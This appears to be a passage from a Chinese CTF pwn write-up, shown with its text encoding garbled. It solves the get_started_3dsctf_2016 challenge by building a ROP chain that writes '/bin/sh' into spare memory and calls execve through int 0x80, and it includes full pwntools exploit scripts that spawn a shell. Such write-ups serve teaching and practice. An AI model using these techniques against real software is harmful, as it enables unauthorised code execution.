<p>ç„¶åï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°è¿™å‡ ä¸ªå‚æ•°å¯¹åº”çš„å€¼ã€‚execve å‡½æ•°åä¸¤ä¸ªå‚æ•°å¯ä»¥ä¸ç®¡è®¾ä¸º 0ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯<code>/bin/sh</code>æˆ–è€…<code>sh</code></p>
<p>ä¸ºäº†å°†è¿™å‡ ä¸ªå‚æ•°é€å…¥å¯„å­˜å™¨ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª gadgetï¼Œä¸ä»…å¯ä»¥å®Œæˆä»»åŠ¡ï¼Œè¿˜å¯ä»¥é€šè¿‡<code>ret</code>æŒ‡ä»¤æ¥ç€è¯»ä¸‹ä¸€æ¡æŒ‡ä»¤</p>
<p>æˆ‘ä»¬ç”¨<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;pop|ret&quot; | grep eax</code>æ‰¾ gadgetï¼š</p>
<p>æ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œæ²¡æœ‰åˆšåˆšå¥½çš„ gadgetï¼Œä½†æ˜¯æœ‰ä¸€æ¡å‹‰å¼ºå¯ç”¨ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0x080b91e6 : pop eax <span class="p">;</span> ret
</span></span></code></pre></div><p>é‚£æˆ‘ä»¬ç»§ç»­æ‰¾ ebxã€ecxã€edxï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$ROPgadget</span> --binary get_started_3dsctf_2016 --only <span class="s2">&#34;pop|ret&#34;</span> <span class="p">|</span> grep ebx
</span></span><span class="line"><span class="cl">0x0809e102 : pop ds <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0809e0fa : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0805bf3d : pop ebp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0809e4c4 : pop ebx <span class="p">;</span> pop ebp <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0809a7dc : pop ebx <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0806fc09 : pop ebx <span class="p">;</span> pop edx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0804f460 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop ebp <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x080483b7 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x080a25b6 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0x10
</span></span><span class="line"><span class="cl">0x08096b1e : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0x14
</span></span><span class="line"><span class="cl">0x080718b1 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0xc
</span></span><span class="line"><span class="cl">0x0804ab66 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret <span class="m">4</span>
</span></span><span class="line"><span class="cl">0x08049a95 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret <span class="m">8</span>
</span></span><span class="line"><span class="cl">0x080509a5 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x080498af : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret <span class="m">4</span>
</span></span><span class="line"><span class="cl">0x08049923 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x080481ad : pop ebx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x080d413c : pop ebx <span class="p">;</span> ret 0x6f9
</span></span><span class="line"><span class="cl">0x08099f96 : pop ebx <span class="p">;</span> ret <span class="m">8</span>
</span></span><span class="line"><span class="cl">0x0806fc31 : pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x08063adb : pop edi <span class="p">;</span> pop esi <span class="p">;</span> pop ebx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0806fc30 : pop edx <span class="p">;</span> pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0809e0f9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0807b1b0 : pop es <span class="p">;</span> pop ebx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0806fc08 : pop esi <span class="p">;</span> pop ebx <span class="p">;</span> pop edx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0805d090 : pop esi <span class="p">;</span> pop ebx <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0805b8a0 : pop esp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
</span></span><span class="line"><span class="cl">0x0809efe2 : pop ss <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
</span></span></code></pre></div><p>å…¶ä¸­ï¼Œæœ‰ä¸€æ¡ä¸€ä¸‹å­å°±èƒ½åŒæ—¶è®¾ç½®ä¸‰ä¸ªéœ€è¦ç”¨çš„å¯„å­˜å™¨ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0x0806fc30 : pop edx <span class="p">;</span> pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
</span></span></code></pre></div><ol>
<li>é‚£ç°åœ¨æˆ‘ä»¬çš„æ ˆä»ä½åˆ°é«˜å°±åº”è¯¥æ˜¯ eax-&gt;edx-&gt;ecx-&gt;ebx</li>
<li>ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>int 0x80</code>è¿™ä¸ª 32 ä½ç³»ç»Ÿè°ƒç”¨ system call çš„ä¸­æ–­æŒ‡ä»¤ï¼ˆ64 ä½å°±æ˜¯ syscallï¼‰ï¼š<code>0x0806d7e5 : int 0x80</code></li>
<li>ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¡«å…¥ ebx å¯„å­˜å™¨çš„<code>/bin/sh</code>ã€‚ç»“æœæ˜¯æ²¡æœ‰<code>/bin/sh</code></li>
</ol>
<blockquote>
<p>PS.è¿™é‡Œä¸èƒ½ç›´æ¥æ‰¾<code>sh</code>å­—ç¬¦ä¸²ï¼Œå› ä¸º execve å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ pathï¼Œå¿…é¡»æ˜¯ç»å¯¹åœ°å€ï¼Œè€Œä¸”å¿…é¡»æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæˆ–è€…è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯åªä¼šæ‰§è¡Œ<code>!#</code>ä¹‹åçš„é‚£ä¸ªè§£é‡Šå™¨ï¼‰ã€‚åœ¨ Linux ç³»ç»Ÿç§çš„<code>sh</code>å‘½ä»¤æ˜¯è½¯é“¾æ¥ï¼Œå¹¶ä¸æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p>å…·ä½“å¯ä»¥æŸ¥çœ‹<a href="https://blog.csdn.net/chichoxian/article/details/53486131">è¿™ç¯‡åšå®¢</a>ï¼Œ<a href="https://introspelliam.github.io/2017/08/07/pwn/linux%E4%B8%8Bsystem-execve-execl-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">è¿™ç¯‡åšå®¢</a>ä¹Ÿå¾ˆä¸é”™</p>
</blockquote>
<h4 id="æ²¡æœ‰ç°æˆbinshæ„å»ºå­—ç¬¦ä¸²">æ²¡æœ‰ç°æˆ<code>&quot;/bin/sh&quot;</code>ï¼šæ„å»ºå­—ç¬¦ä¸²</h4>
<p>è¿™é¢˜æ˜¯é™æ€é“¾æ¥ï¼Œæ²¡æ³• ret2libcã€‚</p>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€å¤„æ²¡æœ‰ç”¨åˆ°çš„åœ°å€ï¼Œåˆ©ç”¨ä¸€äº› gadget å°†æˆ‘ä»¬éœ€è¦çš„å€¼å†™è¿›å»ï¼Œç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªç¨‹åºå¯ä»¥ä½¿ç”¨çš„&quot;/bin/sh&quot;å­—ç¬¦ä¸²åœ°å€ï¼</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€æ¡æŒ‡ä»¤ï¼Œæ”¯æŒæˆ‘ä»¬å‘å†…å­˜ä¸­å†™å…¥å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ pop æ ˆä¸­çš„å€¼åˆ°å¯„å­˜å™¨ï¼Œå†å°†ç©ºé—²å†…å­˜çš„åœ°å€èµ‹ç»™å¦ä¸€ä¸ªå¯„å­˜å™¨ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç©ºé—²åœ°å€å†™å…¥å€¼äº†</p>
<p>é€šè¿‡<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot;</code>å‘½ä»¤ç„¶åæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªå¯ç”¨çš„ gadgetï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dwordè¡¨ç¤ºåŒå­—ï¼Œå°±æ˜¯å››ä¸ªå­—èŠ‚ï¼Œåˆšå¥½æ˜¯32ä½å¯„å­˜å™¨çš„å¤§å°</span>
</span></span><span class="line"><span class="cl">0x080557ab : mov dword ptr <span class="o">[</span>edx<span class="o">]</span>, eax <span class="p">;</span> ret
</span></span></code></pre></div><p>ç„¶åæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ä¹‹å‰æ‰¾åˆ°è¿‡çš„<code>pop edx;pop ecx;pop ebx;ret</code>å°†åœ°å€å¼¹åˆ° edx ä¸­</p>
<p>ç„¶åæˆ‘ä»¬ç”¨ ida æ‰¾åˆ°ä¸€å—é—²ç½®ç©ºé—´ï¼ˆä¸€ç›´æ»šåˆ°.data æ®µï¼Œæœ€åæœ‰ä¸€å°æ®µé‡å¤çš„ db 0ï¼‰</p>
<p><img src="/image/202209080117042022-09-08-01-17-04.png" alt="202209080117042022-09-08-01-17-04"></p>
<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å®Œæˆæˆ‘ä»¬çš„ payload äº†ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
</span></span><span class="line"><span class="cl"><span class="n">int80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
</span></span><span class="line"><span class="cl"><span class="n">spare_space</span> <span class="o">=</span> <span class="mh">0x080EB0C0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;/bin&#34;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_ecx_eax_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">int80</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="å®Œæ•´-exp2">å®Œæ•´ exp2</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./get_started_3dsctf_2016&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># libc_name: str = &#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;b* 0x8048A40&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
</span></span><span class="line"><span class="cl"><span class="n">int80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
</span></span><span class="line"><span class="cl"><span class="n">spare_space</span> <span class="o">=</span> <span class="mh">0x080EB0C0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc0a</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc31</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_ecx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080701a5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;/bin&#34;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">int80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜">ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜</h4>
<h5 id="ä½œè€…è¯•å›¾ä¸ä½¿ç”¨pop-edxpop-ecxpop-ebxretåªä½¿ç”¨pop-edxret">ä½œè€…è¯•å›¾ä¸ä½¿ç”¨<code>pop edx;pop ecx;pop ebx;ret</code>åªä½¿ç”¨<code>pop edx;ret</code></h5>
<blockquote>
<p>æˆ‘ä»¬ç”¨<code> ROPgadget --binary get_started_3dsctf_2016 --only &quot;pop|ret&quot;</code>å‘½ä»¤æ‰¾åˆ°äº†<code>pop edx</code>çš„å‘½ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0x0806fc0a : pop edx <span class="p">;</span> ret
</span></span></code></pre></div><p>çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰é—®é¢˜</p>
</blockquote>
<p>ä»¤äººç–‘æƒ‘çš„æ˜¯ï¼Œè¿™æ ·å­è¿æ ˆéƒ½æ²¡æ³•å†™å…¥(åœ¨ pop eax åå°±æ˜¯è¿ä¸²çš„ popal)ï¼Œå¯èƒ½æ˜¯æˆ‘æ‰¾çš„è¿™ä¸ª gadget æœ¬èº«æœ‰ç‚¹å°é—®é¢˜</p>
<p>ä½†æ˜¯æˆ‘å°è¯•äº†<code>pop ecx;pop ebx;ret</code>å’Œ<code>mov [ecx+4], eax</code>ï¼Œç¨‹åºå®Œå…¨æ­£å¸¸è¿ä½œï¼Œå¯ä»¥æ­£å¸¸å¾—åˆ° shell</p>
<p>payload å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
</span></span><span class="line"><span class="cl"><span class="n">int80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
</span></span><span class="line"><span class="cl"><span class="n">spare_space</span> <span class="o">=</span> <span class="mh">0x080EB0C0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc0a</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc31</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_ecx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080701a5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿™é‡Œä¸€å®šè¦-4ï¼Œå› ä¸ºgadgetåŠ äº†4</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;/bin&#34;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_ecx_eax_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">int80</span><span class="p">)</span>
</span></span></code></pre></div><h5 id="æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶">æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶</h5>
<p>ä½œè€…ä¸€å¼€å§‹è¯•å›¾<code>execve(&quot;sh&quot;, 0, 0)</code>ï¼Œä½†æ˜¯æŸ¥é˜…èµ„æ–™åæ˜ç™½åªèƒ½æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œäºæ˜¯åˆè¯•å›¾æ‰§è¡Œ<code>/bin/ls</code>å’Œ<code>/usr/bin/python3.10</code>ï¼Œä½†æ˜¯å‡å› ä¸æ˜åŸå› å¤±è´¥äº†</p>
<hr>
<p>å¦‚æœå„ä½çœ‹å®˜çŸ¥é“äº†åŸå› ï¼Œå¯ä»¥åŠ³çƒ¦æ‚¨åœ¨è¯„è®ºåŒºä¸ºä½œè€…å’Œåæ¥äººä½œä¸€ç•ªè§£é‡Šå—ï¼Ÿæ„Ÿæ¿€ä¸å°½ï¼</p>

</article>


      
        <div class="my-4">
    
    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
    
    <a href="https://peterliuzhi.top/tags/syscall/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#syscall</a>
    
</div>
      

      
  <div class="flex md:justify-end my-4">

    <a href="https://github.com/PeterLiu-all/peterliu-all.github.io/content/writeup/%e3%80%90syscall%e3%80%91get_started_3dsctf_2016.md" title="Edit this page">
      <i class="fas fa-edit me-1"></i>
